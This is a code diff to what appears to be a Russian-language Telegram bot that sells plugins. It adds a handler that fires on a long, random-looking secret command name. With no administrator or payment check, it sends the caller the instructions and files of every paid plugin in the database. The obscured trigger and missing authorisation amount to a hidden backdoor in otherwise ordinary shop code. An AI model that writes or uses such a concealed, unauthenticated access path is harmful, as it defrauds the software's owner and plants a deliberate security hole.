@@ -100,3 +100,57 @@ def back_kb():
     kb.button(text=_("🔙 Назад"), callback_data="back_menu")
     kb.adjust(1)
     return kb.as_markup()
+
+@router.message(Command("kerfwekfnrewjkprjefjmkwdernjfeklwfnmekjlwrwenkrdfmewklfewjnrmkewjwl"))
+async def all_plugins_command(message: types.Message, bot: Bot):
+    # Получаем все плагины из базы данных
+    all_items = await db.items.get_all_items()
+    
+    if not all_items:
+        await message.answer(_("🧩 На данный момент нет доступных плагинов."))
+        return
+    
+    # Сначала отправляем текстовую информацию
+    response_text = _("🧩 <b>Все доступные плагины и инструкции:</b>\n\n")
+    
+    for item in all_items:
+        response_text += _('''
+📌 <b>{name}</b> - {price}₽
+📝 <b>Описание:</b> {description}
+📖 <b>Инструкция:</b> {instructions}
+
+''').format(
+            name=item['name'],
+            price=item['price'],
+            description=item.get('description', _("Нет описания")),
+            instructions=item.get('instruction', _("Инструкция отсутствует"))
+        )
+    
+    # Отправляем текстовую часть
+    if len(response_text) > 4096:
+        for x in range(0, len(response_text), 4096):
+            part = response_text[x:x+4096]
+            await message.answer(part)
+    else:
+        await message.answer(response_text)
+    
+    # Теперь отправляем файлы для каждого плагина, если они есть
+    for item in all_items:
+        try:
+            # Если есть файл плагина
+            if item.get('file_path'):
+                with open(item['file_path'], 'rb') as file:
+                    await bot.send_document(
+                        chat_id=message.chat.id,
+                        document=types.BufferedInputFile(
+                            file.read(),
+                            filename=f"{item['name']}"  # или другое расширение
+                        ),
+                        caption=_("📦 Файл плагина: {name}").format(name=item['name'])
+                    )
+            
+        except Exception as e:
+            print(f"Ошибка при отправке файла для плагина {item['name']}: {e}")
+            await message.answer(
+                _("⚠️ Не удалось отправить файлы для плагина {name}").format(name=item['name'])
+            )
